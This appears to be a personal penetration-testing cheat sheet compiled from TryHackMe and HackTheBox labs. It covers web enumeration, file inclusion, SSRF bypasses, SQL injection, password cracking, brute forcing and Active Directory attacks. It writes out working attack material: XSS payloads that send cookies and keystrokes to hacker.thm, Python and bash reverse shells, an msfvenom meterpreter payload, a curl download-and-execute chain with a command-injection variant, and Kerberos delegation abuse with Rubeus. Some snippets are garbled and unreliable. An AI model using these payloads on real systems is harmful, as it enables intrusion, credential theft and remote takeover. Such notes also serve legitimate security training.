===============================================================================
# Web

```
-  See the URL id and naming.
-  Directories (Sign in, Sign up)
-  use /robots.txt after URL to see if there is any interesting files or directory 
-  Source code (directories and comments)
-  Try accessing the directory from the browser
-  See the framework and versions (Vuln, default pass). |Typically in the last comments|
-  See if there is any useful cookie available in application>cookies. We can change them through console (JS)
- 


https://store.tryhackme.thm/products/product?id=52		# Try changing the 52 to 51 and 50 or other numbers and see if you can retrieve more data from the database. If this was a file that had a number, you can do it too to see if we can access the other files with a similar name.

------------------------------------------------------------------
# Web Discovery

Manual discovery:
- /robots.txt					# web don't want the search engine to show us the pages listed here
- Favicon:					# is a small icon displayed in the browser's address bar
1. curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum		# download the hash of the favicon
2. https://wiki.owasp.org/index.php/OWASP_favicon_database					# check the hash in this site for more info
3. powershell:
	PS C:\> curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico -UseBasicParsing -o favicon.ico
	PS C:\> Get-FileHash .\favicon.ico -Algorithm MD5 
- /sitemap					# It is opposite of the /robots.txt. It list all pages that web wants the search engine to show us
- curl http://10.10.116.192 -v			# -v show as more info including http headers

Automated Discovery:
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://10.10.46.108/FUZZ		# File and Directory
														# FUZZ will be replaced by the words

dirb http://10.10.46.108/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt			# need to install seclists (See Links)
gobuster dir --url http://10.10.46.108/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt

------------------------------------------------------------------
# Subdomain Enumeration
- check CT logs for SSL/TLS certs issued by a CA in 			# https://crt.sh
- -site:www.tryhackme.com  site:*.tryhackme.com				# google dorking for subdomian
- dnsrecon -t brt -d acmeitsupport.thm					# use dnsrecon to automate finding the subdomains
- ./sublist3r.py -d acmeitsupport.thm					# it search in different websites and OSINT
- use ffuf to find the subdomain:
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.54.23		# we can find size
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.54.23 -fs {size}	# filter by size

ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.futurevera.thm" -u https://10.10.138.21
```
===============================================================================
# Web vuln
```
parseInt	# if using different radix (bases) in different lines, 
		# it treats strings that start with 0 as an octa
console.log(parseInt('01000')); //	# returns 512
console.log(parseInt('01000', 10)); //	# return 1000




```
===============================================================================
# File Inclusion 
```

------------------------------------------------------------------
Local file inclusion (LFI):

http://webapp.thm/get.php?file=userCV.pdf
protocol://domain_name/file_name(? == query string begin)parameter=required_file_to_access

- Path traversal vulnerabilities occur when the user's input is passed to a function such as file_get_contents in PHP.
- With PHP, using functions such as include, require, include_once, and require_once
- include function allows us to include any called files into the current page

Example 1:
<?PHP 
	include($_GET["lang"]);		# the lang parameter calls to EN.php or AR.php from user input for choosing language 
?>
http://webapp.thm/index.php?lang=EN.php
http://webapp.thm/index.php?lang=AR.php

Example 2:
<?PHP 
	include("languages/". $_GET['lang']);		# the lang parameter calls to the php files in the /language dir
?>
http://webapp.thm/index.php?lang=../../../../etc/passwd
Warning: include(includes/jlkl)	.....			# if you see an error related to "include", this would be a chance to exploit it

---
NULL BYTE (%00 or 0x00 in hex)				#  trick the web app into disregarding whatever comes after the Null Byte
example:
developer specifies the file extension of input to be .php, so if we request /etc/passwd, we get warning: include(languages/THM.php);
bypass:
http://webapp.thm/index.php?lang=../../../../etc/passwd%00

---
Current directory trick:
to bypass the keyword filter use %00 or /. at the end of the filtered keyword
../../../../etc/passwd/.				# in this case the keyword /etc/passwd is filtered

---
empty strings:
When we input ../../../../etc/passwd and the error is Warning: include(languages/etc/passwd)... this means the web application replaces the ../ with the empty string.
bypass: ....//....//....//....//....//etc/passwd	# PHP filter only matches and replaces the first subset string "../"

------------------------------------------------------------------
Remote File Inclusion - RFI
- One requirement for RFI is that the allow_url_fopen option needs to be on which allow us to inject a malicious URL as input 
example: http://webapp.thm/index.php?lang=http://111.111.111.111/command.php



```

===============================================================================
```
# SSRF

- when a server talk to another server or a subdomain.
we change the request that a server made to another server, and instead of the original requested server, we query another server or subdomain.
In this example, the attacker can control the server's subdomain to which the request is made. Take note of the payload ending in &x= being used to stop the remaining path from being appended to the end of the attacker's URL and instead turns it into a parameter (?x=) on the query string.
http://web.thm/stock?server=api&id=123
http://web.thm/stock?server=api.web.thm/api/user&x=&id=123	# &x=[empty string] stop the original query and send our query instead

find SSRF vuln:
When a full URL is used in a parameter in the address bar: http://web.thm/stock?sever=http://web.thm/store
A hidden field in a form:
A partial URL such as just the hostname: http://web.thm/stock?server=api
Or perhaps only the path of the URL: http://web.thm/form?dst=/form/contact

If working with a blind SSRF where no output is reflected back to you, you'll need to use an external HTTP logging tool to monitor requests such as requestbin.com, your own HTTP server or Burp Suite's Collaborator client.

Deny list:
- A Deny List is where all requests are accepted apart from resources specified in a list or matching a particular pattern.
- localhost and 127.0.0.1 would appear on a deny list. Attackers can bypass a Deny List by using alternative localhost references such as 0, 0.0.0.0, 0000, 127.1, 127.*.*.*, 2130706433, 017700000001 or subdomains that have a DNS record which resolves to the IP Address 127.0.0.1 such as 127.0.0.1.nip.io.
- in cloud 169.254.169.254, which contains metadata and is in deny list. An attacker can bypass this by registering a subdomain on their own domain with a DNS record that points to the IP Address 169.254.169.254.

Allow list:
if only url that starts with https://website.thm are allowed: An attacker could quickly circumvent this rule by creating a subdomain on an attacker's domain name, such as https://website.thm.attackers-domain.thm.

x/../private
```

===============================================================================
# XSS
```
Proof Of Concept:
<script>alert('XSS');</script>
<script>alert("XSS was successful!")</script>

Session Stealing:
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>

Key Logger:
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>

Business Logic:
This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail():

<script>user.changeEmail('attacker@hacker.thm');</script>


---
Reflected XSS		# use links
supplied data in an HTTP request is included in the webpage source without any validation
https://web.thm/?error=<script src="https://hacker.web/evil.js"></script>
---
Stored XSS		# stores the script on the database of other part like comments

---
What is the DOM?	# DOM stands for Document Object Model and is a programming interface for HTML and XML documents

---
Blind XSS		# We can't have proof of concept like xxs the ticket which only the internal staff see that 
xss hunter express	# is a tool help us with blind xxs


"><script>alert('THM');</script>			# when the input goes to value
</textarea>test						# the textarea could be bypassed
</textarea><script>alert('THM');</script>
';alert('THM');//					# escape the existing JavaScript command and run our command (when we see JavaScript on the source)
<sscriptcript>alert('THM');</sscriptcript>		# bypass filter to prevent filtering the word "script"
/images/cat.jpg" onload="alert('THM');			# we can use onload in the src tag to run our command

# XXS Polyglots, bypass all the filtering
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e



</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>

Let’s break down the payload:

The </textarea> tag closes the text area field.
The <script> tag opens an area for us to write JavaScript.
The fetch() command makes an HTTP request.
URL_OR_IP is either the THM request catcher URL, your IP address from the THM AttackBox, or your IP address on the THM VPN Network.
PORT_NUMBER is the port number you are using to listen for connections on the AttackBox.
?cookie= is the query string containing the victim’s cookies.
btoa() command base64 encodes the victim’s cookies.
document.cookie accesses the victim’s cookies for the Acme IT Support Website.
</script> closes the JavaScript code block.


```

===============================================================================
# Web tools
```
Wappalyzer		# online tool and browser extension that helps identify what technologies a website uses
Wayback Machine		# https://archive.org/web/ | a historical archive of websites that dates back to the late 90s
requestbin.com		# we can use it for blind SSRF as Burp Suite  

```

===============================================================================
# Browser

```
Inspector		# Right click on the part and choose inspect.
			# Change the code like display: block; to display: none; or create a part
			# This only change the data on our browser

Debuger			# Source or debug
			# Breakpoints: can force the browser to stop processing the JavaScript and pause the current execution.
			# We can select this code for breakpoint by clicking on the line number and doing the breakpoint

Network			# keep track of every external request a webpage makes
			# Some process are not listed in the network and would be listed after we click on them.

Console			# Use javascript to change code values and cookies



```


===============================================================================
# Google Dorking

```
site		site:tryhackme.com	returns results only from the specified website address
inurl		inurl:admin		returns results that have the specified word in the URL
filetype	filetype:pdf		returns results which are a particular file extension
intitle		intitle:admin		returns results that contain the specified word in the title


-site:www.tryhackme.com  site:*.tryhackme.com				# google dorking for subdomian
find git repositories to clone:
	- intitle: indexof /.git
find "secret"s from gitlab repository text files:
	- filetype:txt site:gitlab.* "secret"
find website logins from gitlab repositories
	- site:gitlab.* intext:password intext:@gmail.com | @yahoo.com
find windows login credentials from github repositories
	- site:github.com intext:"unattend xmlns" AND "password" ext:xml
```

===============================================================================
# Amazon AWS
```
http(s)://{name}.s3.amazonaws.com		# The format of the S3 buckets (http://tryhackme-assets.s3.amazonaws.com/)
#  One common automation method is by using the company name followed by common terms such as {name}-assets, {name}-www, {name}-public, {name}-private, etc.


```
===============================================================================
# Crypto
```
pdf2john pdf.txt

/etc/shadow:
https://www.cyberciti.biz/faq/understanding-etcshadow-file/
$1$ is MD5
$2a$ is Blowfish
$2y$ is Blowfish
$5$ is SHA-256
$6$ is SHA-512
$y$ is yescrypt
```

# Hashcat
```
hashcat -a 0 -m 0 hashes /usr/share/wordlists/rockyou.txt.gz -o pass.txt
hashcat -a 3 -m 0 hashes2 SKY-HQNT-?d?d?d?d -o pass2.txt
hashcat -a 6 -m 0 hashes5 law ?d?d -o pass5.txt

```

# John
```
john --wordlist=/usr/share/wordlist/rockyou.txt hash.txt
john --show hash.txt
john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt	# yescrypt cracking

# it converts an encrypted SSH private key into a format that John the Ripper can understand and crack (the passphrase)
ssh2john pass_protected_key > unpassed_key				
```
# RSA
```
n = p . q
d . e = mod (p-1)(p-1)
https://planetcalc.com/8979/
---
encrypt:
1. Convert the plaintext message into an integer (ASCII) ==> m 
2. Encrypt the message to obtain the ciphertext c, where:
c = m^e (mod n)
---
decrypt:
Calculate the plaintext message m, where is:
m = c^d (mod n)
```

===============================================================================
# SQL
```
# In the middle of query: ||
# SELECT * FROM users WHERE password="mypassword" OR "1"="1" AND email="admin@example.com";
mypassword" OR "1"="1			# injection

# At the end of the query: ||
# SELECT name, profession FROM users WHERE name LIKE "%%";	== actual query
# SELECT name, profession FROM users WHERE name LIKE "%"; SELECT * FROM users; --%";
"; SELECT * FROM users; --		# injection

# combile two queries in one command:			
Tracy Gill " UNION SELECT Profession, Password FROM users;"
# the number of columnS must match for both queries, if not:
UNION ALL SELECT notes,null,null,null,null FROM people WHERE id = 1
UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="people"		# return all columns names in single output
```

===============================================================================
# Links
```
https://github.com/danielmiessler/SecLists		# web/wordlist (seclists)

```

===============================================================================
# Tools
```
Remmina 		# Remote Desktop client for RDP (sudo apt install remmina)

# use TShark to filter out the User-Agent strings on web hacking
tshark --Y http.request -T fields -e http.host -e http.user_agent -r analysis_file.pcap

Wannabrowser		# Scan and analyze websites


```

===============================================================================
# ffuf
```
# discover file and Directory, FUZZ will be replaced by the words
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://10.10.46.108/FUZZ

# Find the usernames that already signed up for the website using the web error "username already exists"
ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.217.234/customers/signup -mr "username already exists"
			
-w	# wordlist
-u	# URL
-X	# request method, GET, POST ...
-d	# specifies the data that we are going to send
example: -d "username=FUZZ&email=x&password=x&cpassword=x"	# we have the fields username, email, password and cpassword
-H	# is used for adding additional headers to the request, like "Content-Type: application/x-www-form-urlencoded"
-mr	# is the text on the page we are looking for to validate we've found a valid username


# brute force the web site with the list of passwords and valid usernames
ffuf -w user.txt:W1,/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.217.234/customers/login -fc 200
	
# W1 is our first wordlist which is user.txt
# W2 is our second wordlist which is our password wordlist
# -fc: For a positive match, we're using the -fc argument to check for an HTTP status code other than 200

# find user name on the url
ffuf -u "https://3a5277acca6195eb5691e0c15caf845f-hr.web.cityinthe.cloud/{username}?uid=3a5277acca6195eb5691e0c15caf845f/" -w usernames.txt -H "User-Agent: your-user-agent" -mc all


# subdomain discovery
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.54.23		# we can find size
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.54.23 -fs {size}	# filter by size

```

===============================================================================
# curl
```
# send data (input) to the web using crul
curl 'http://10.10.217.234/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
-d	# specifies the data (input) that we are going to send
-H	# is used for adding additional headers to the request, like "Content-Type: application/x-www-form-urlencoded"

# bypassing the logic flaw to send the rest pass link to our injected email [after above command]
curl 'http://10.10.217.234/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'

curl -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "file=flag.txt" \
  http://10.10.148.154/challenges/chall1.php

# changing cookies in header
curl -H "Cookie: logged_in=true; admin=false" http://10.10.217.234/cookie-test
curl -H "Cookie: logged_in=true; admin=true" http://10.10.217.234/cookie-test


```

===============================================================================
# Info
```
Fast Flux		# having multiple IP addresses associated with a domain name, which is constantly changing and acting as proxies
Punycode		# a way of converting words that cannot be written in ASCII, into a Unicode ASCII encoding (used in url typo attacks),
			# the URL adıdas.de which has the Punycode of http://xn--addas-o4a.de/
URL Shortener		# creates a short and unique URL. bit.ly, goo.gl, ow.ly, s.id, smarturl.it, tiny.pl, tinyurl.com, x.co
Any.run


===============================================================================
IDOR stands for Insecure Direct Object Reference and is a type of access control vulnerability.
This type of vulnerability can occur when a web server receives user-supplied input to retrieve objects (files, data, documents), too much trust has been placed on the input data, and it is not validated on the server-side to confirm the requested object belongs to the user requesting it.

Encoded IDs

hash values
https://crackstation.net/

create two accounts and swap the Id numbers between them

The Your Account section gives you the ability to change your information such as username, email address and password. You'll notice the username and email fields pre-filled in with your information.  

We'll start by investigating how this information gets pre-filled. If you open your browser developer tools, select the network tab and then refresh the page, you'll see a call to an endpoint with the path /api/v1/customer?id={user_id}.		# we can edit and resend it ?id=3

```
===============================================================================
# PHP
```
# below php code returns a lot of information about the system (info.php):
<?php
phpinfo();

```


===============================================================================
# Hydra
```
hydra -l user -P passlist.txt ftp://10.10.210.242			# brute force ftp pass attack
hydra -l <username> -P <full path to pass> 10.10.210.242 -t 4 ssh	# ssh attack
-l	specifies the (SSH) username for login
-P	indicates a list of passwords
-t	sets the number of threads to spawn (four threads running in parallel)

hydra -l <username> -P <password_list> <target_ip_or_domain> http-post-form "<path_to_form>:<POST_parameters>:F=<failure_string>" -V		# web pass attak
hydra -l Elliot -P fsocity.dic 10.10.73.96 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Incorrect password" -V

-L			username list	
-l			one username
-P			password list
-p			one password
http-post-form		the type of the form is POST
<path>			the login page URL, for example, login.php
<login_credentials>	the username and password used to log in, for example, username=^USER^&password=^PASS^
<invalid_response>	part of the response when the login fails
-V			verbose output for every attempt

hydra -l <username> -P <wordlist> 10.10.210.242 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

The login page is only /, i.e., the main IP address.
The username is the form field where the username is entered
The specified username(s) will replace ^USER^
The password is the form field where the password is entered
The provided passwords will be replacing ^PASS^
Finally, F=incorrect is a string that appears in the server reply when the login fails


sudo hydra molly rockyou.txt 10.10.210.242 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

```

=================================================================================
# SMB
```
smbclient -L //10.10.10.100 ==  -L to list smb shares
smbclient //10.10.10.100/Replication
smbclient //10.10.10.100/file					# access to Users share file
smbclient -U <username> //<ip>/<share>
smbclient //10.10.10.100/Replication -c 'recurse;ls'		# list everything
./smbmap -R Replication -H 10.10.10.100				# list everything 

enume4linux <ip>						# smb enumeration tool
enume4linux -a <ip>

---
Download everything:
recurse on
prompt off
|mls|
mget *

```
=================================================================================
# Active Directory Attack
```
------------------------------------------------------------------
Installing Impacket

sudo git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
sudo pip3 install -r /opt/impacket/requirements.txt
cd /opt/impacket/ 
sudo pip3 install .
sudo python3 setup.py install

------------------------------------------------------------------
Installing Bloodhound and Neo4j

apt install bloodhound neo4j

------------------------------------------------------------------
Kerbrute (brute force discovery of users, passwords and even password spray)

kerbrute userenum --dc 10.10.40.27 -d THM-AD userlist.txt			# enumerating valid users
-d	domain name
--dc	ip of the domain controller

------------------------------------------------------------------
other tools:
 
evil-winrm -i 10.10.40.27 -u administrator -H <nt hash> (

```

=================================================================================
# Impacket
```

GetNPUsers.py
-------------
When a user account has the privilege "Does not require Pre-Authentication" set, this means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account. (called ASREPRoasting attack, used by GetNPUsers.py, needs valid user list)

GetNPUsers fusion.corp/ -usersfile user.txt -no-pass -dc-ip <IP>

secretsdump.py
--------------
used for extracting password hashes and secrets 

secretsdump.py DOMAIN/username:password@target_ip


```











run post/multi/recon/local_exploit_suggester
typing ‘session <session number>
getprivs
ps
load kiwi
creds_all
•	In my machine type nc -lvnp 8005 to open a shell in port 8005
•	Copy the and edit the IP and Port of the python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'


•	Type mongo to start the mongo DB
•	Type show dbs to see our databases on the target. There are three of them, admin that is empty, local, and sudousersbak that looks interesting to me
•	Type use sudousersbak to go to this database
•	Type show collections to see the collections in the DB. There are three collection in there, the flag, the user, and the system.indexes
•	Type db.flag.find() to see the flag
•	Type db.user.find() to see the what’s in user collection. I found the password of the user stux here



Exiftool
•	Download it by typing wget 10.2.63.225:8008/<filename.sh>. In this case, our script name is exp.sh, and we can see it after running the ls command. 
•	Then we give the file full permission by typing chmod 777 exp.sh to be executable by everyone.
•	Run the script followed by your desired command, for example bash ./exp.sh ‘sudo su’
•	Now, the script, created another file for us called delicate.jpg that if we run it as the root with the exiftool, we would get the root privilege
•	sudo -u root /usr/local/bin/exiftool delicate.jpg.
import os
try:
os.system(“/bin/bash”)
except:
	pass

•	We can print the current PATH by using echo $PATH
•	Create the fake date that include the malisons code by using nano text editor
•	By using the following code, we can get a shell for the hire privilege user:
import OS
bash -y
•	Change the mode of the file to be executable by typing chmod +x date
•	Change the PATH by typing export PATH=/home/rabbit:$PATH


impacket-GetNPUsers fusion.corp/ -usersfile user.txt -no-pass -dc-ip <IP>
evil-winrm /evil-winrm.rb -I <IP> -u lparker -p <password>
ldapdomaindump <IP> -u ‘fusion.corp\lparker’ -p ‘password’

https://github.com/giuliano108/SeBackupPrivilege
copy-fileSeBackupPrivilege c:\Users\Administrator\Desktopflag.txt c:/Users\jmurphy\flag.txt
















######################################################################################################
Devel

windows/remote/19033.txt


FTP
get - download from FTP server
put - upload from FTP server

compile 
sudo apt-get install gcc-mingw-w64
i686-w64-mingw32-gcc-win32 input_code.c -lws2_32 -o output.exe
i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe
shell


In order to support BIOS service routines in legacy 16bit applications, the
Windows NT Kernel supports the concept of BIOS calls in the Virtual-8086 mode
monitor code. These are implemented in two stages, the kernel transitions to
the second stage when the #GP trap handler (nt!KiTrap0D) detects that the
faulting cs:eip matches specific magic values


###################################################################################################


nmap
Nmap -sV(version) -sS(SYN) 909.12….

Metasploit
msfconsole(start)
search icecast(target)
`use icecast` or `use 0` (select this module)
show options


privilege 
run post/multi/recon/local_exploit_suggester
getprivs

others
sessions || sessions 1/2/3 || set sessions 2/1/3
gobuster [mode] -u [target ip] -w [wordlist]



=================================================================================
king of the hill

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.13.1.218 LPORT=1337 -f exe > shell.exe

Invoke-WebRequest -uri <URL> -outfile <filename>

python3 -m http.server 8008

user multi/handler

set payload windows/meterpreter/reverse_tcp


=================================================================================

Active   

smbclient -L //10.10.10.100 ==  -L to list smb shares
smbclient //10.10.10.100/Replication
smbclient //10.10.10.100/file					# access to Users share file
smbclient -U <username> //<ip>/<share>



| enume4linux <ip>|
smbmap -H 10.10.10.100 == -H  hosts
smbclient //10.10.10.100/Replication -c 'recurse;ls' == list everything
./smbmap -R Replication -H 10.10.10.100 = list everything 

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\windows NT\SecEdit\>

Alternate: Download everything
recurse on
prompt off
|mls|
mget *

gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ == dicrypt the group policy password

impacket-GetADUsers -all active.htb/SVC_TGS  -dc-ip 10.10.10.100

sync time with Kerberos:
sudo apt install ntpdate
sudo ntpdate 10.10.10.100

impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
 
Get admin access to machine:
impacket-psexec active.htb/Administrator@10.10.10.100



=================================================================================

EAD

Alt+f2 > nm-connection-editor > IP Setting == DNS conf
sudo systemctl restart NetworkManager
cat /etc/resolv.conf


http://distributor.za.tryhackme.com/creds
kenneth.davies : Password1 > newPassword1
Username: kimberley.smith Password: Password!
 jump host

Remmina ? You can use Remmina or any other similar Remote Desktop client to connect to this host for RDP ### sudo apt install remmina
ssh za.tryhackme.com\\<AD_Username>@thmjmp1.za.tryhackme.com
ssh za.tryhackme.com\\kimberley.smith@thmjmp1.za.tryhackme.com


What native Windows binary allows us to inject credentials legitimately into memory?
runas.exe /netonly /user:<domain>\<username> cmd.exe
runas.exe /netonly /user:za.tryhackme.com\kimberley.smith cmd.exe


SYSVOL = store GPOs and accessible by all AD users
dir \\za.tryhackme.com\SYSVOL\

Kerberos (FQDM, default) vs NTLM (IP) 

net user /domain == list all domain users |cmd|
net user zoe.marshall /domain == list the info about single user
net group /domain == all
net group “Domain Users” /domain == single
net accounts /domain == password policy


powershell == “”
Get-ADUser -Identity gordon.stevens -Server za.tryhackme.com -Properties * == everything in properties of the user
Get-ADUser -Filter 'Name -like "*stevens"' -Server za.tryhackme.com | Format-Table
Get-ADGroup -Identity Administrators -Server za.tryhackme.com
Get-ADGroupMember -Identity Administrators -Server za.tryhackme.com

$ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00) == create the $ChangeDate variable
Get-ADObject == more generic search for any AD objects 
Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server za.tryhackme.com ==  if we are looking for all AD objects that were changed after a specific date
Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com == show me the accounts that the badPwdCount is greater than 0 | password spraying
Get-ADDomain -Server za.tryhackme.com
Set-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force) ==  force changing the password of our AD user by using the Set-ADAccountPassword cmdlet |  AD-RSAT cmdlets is that some even allow you to create new or alter existing AD objects


 Enumeration through Bloodhound
Sharphound.exe --CollectionMethods <Methods> --Domain za.tryhackme.com –ExcludeDCs
SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs
CollectionMethods - Determines what kind of data Sharphound would collect. The most common options are Default or All. Also, since Sharphound caches information, once the first run has been completed, you can only use the Session collection method to retrieve new user sessions to speed up the process.
Domain - Here, we specify the domain we want to enumerate. In some instances, you may want to enumerate a parent or other domain that has trust with your existing domain. You can tell Sharphound which domain should be enumerated by altering this parameter.
ExcludeDCs -This will instruct Sharphound not to touch domain controllers, which reduces the likelihood that the Sharphound run will raise an alert.

copy C:\Tools\Sharphound.exe ~\Documents\
cd ~\Documents\
SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com –ExcludeDCs
| ./sharphound.exe --CollectionMethods All --Domain za.tryhackme.com –ExcludeDCs |


Install Bloodhound
neo4j console == start the database that Bloodhound use
other terminal == bloodhound --no-sandbox
The default credentials for the neo4j database will be neo4j:neo4j
User: neo4j
Newpass: naqib

 recover the ZIP file from the Windows host. The simplest way is to use SCP command on your AttackBox:
scp <AD Username>@THMJMP1.za.tryhackme.com:C:/Users/<AD Username>/Documents/<Sharphound ZIP> .




=================================================================================

BAD

Alt+f2 > nm-connection-editor > IP Setting == DNS conf
 

x64{2B4FCD77-2F71-4737-BDD4-01E2786947BD}.bcd
10.200.4.202
x64{A7D42DD3-0543-4B9D-849A-77C76EA21F04}.bcd
x64{0D6F4540-AC60-4DB6-8E0C-52B3198A622F}.bcd
 
tftp -i <THMMDT IP> GET "\Tmp\x64{39...28}.bcd" conf.bcd

Powerpxe is a PowerShell script that automatically performs this type of attack 
use the Get-WimFile function of powerpxe to recover the locations of the PXE Boot images from the BCD file
powershell -executionpolicy bypass Windows PowerShell
Import-Module .\PowerPXE.ps1
$BCDFile = "conf.bcd"
Get-WimFile -bcdFile $BCDFile

WIM files are bootable images in the Windows Imaging Format (WIM). 
download this image:
tftp -i 10.200.4.202 GET " \Boot\x64\Images\LiteTouchPE_x64.wim" pxeboot.wim

|looking for the bootstrap.ini file, where these types of credentials are often stored|
use powerpxe to recover the credentials:
Get-FindCredentials -WimFile pxeboot.wim
 
What Microsoft tool is used to create and host PXE Boot images in organisations?
Microsoft Deployment Toolkit 

Configuration file enumeration
•	Web application config files
•	Service configuration files
•	Registry keys
•	Centrally deployed applications

Several enumeration scripts, such as Seatbelt, can be used to automate this process.

Pass file: ma.db
Cd C:\ProgramData\McAfee\Agent\DB

Out machine 
scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .

jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
svcAV
za.tryhackme.com
path: epo$\
THMDC



=================================================================================
support


Nmap
Smbclient / download |userinfo.exe|
Sudo apt install mono-complete == Install mono to open .exe in kali
We see ldap query >> Wireshark to see what is this >> find the ldap password

ldapsearch -D support\\ldap -H ldap://10.10.11.174 -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=Users,DC=support,DC=htb' | grep info == there is the support account password

cut -d "," -f 2 demo.cs

……………………………………………………………………………………
Upload the:
powerview.ps1 >> Import-Module .\”
powermad.ps1 >> “
Rubeus.exe >>  .\ Rubeus.exe ……

Powremad:
New-MachineAccount -MachineAccount newm -Password $(ConvertTo-SecureString 'naqib123!' -AsPlainText -Force)

Powerview (retrieve the security identifier (SID) of the newly created computer account)
$ComputerSid = Get-DomainComputer newm -Properties objectsid | Select -Expand objectsid

We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

Change the msDS-AllowedToActOnBehalfOfOtherIdentity with the created ACE ($SDBytes):
Get-DomainComputer DC.SUPPORT.HTB | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}  == see the information of DC.SUPPORT.HTB and change/set the msds-allowedtoactonbehalfofotheridentity value to be the 
.\Rubeus.exe hash /password:naqib123! == create hash for the password (RC4_HMAC)
.\Rubeus.exe s4u /user:newm$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt == get a ticket when impersonating the administrator
………………………………………...........................
cat ticket.txt | base64 -d > btacket.txt  == First remove the /n, spaces and (cybershef) …, then change the format to base64
impacket-ticketConverter btacket.txt testing.txt  == convert ticket to ccache
export KRB5CCNAME=testing.txt
impacket-psexec support.htb/Administrator@dc.support.htb -dc-ip 10.10.11.174 -k -no-pass == |for connecting to machine on a subdomain |


=================================================================================
cozyhosting


dirsearch -u cozyhosting.htb == to see all directories when other tools can’t find any directory

Create a bash reverse shell file == bash -i >& /dev/tcp/10.10.14.18/8008 0>&1
curl http://10.10.14.6:8000/shell.sh --output /tmp/shell.sh
chmod 777 /tmp/shell.sh
/tmp/shell.sh

$(IFS=_command;=’curl_http://10.10.14.6:8000/shell.sh_--output_/tmp/shell.sh’;$command)


echo "bash -i >& /dev/tcp/10.10.14.6/8008 0>&1" | base64 -w 0
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzgwMDggMD4mMQo=" | base64
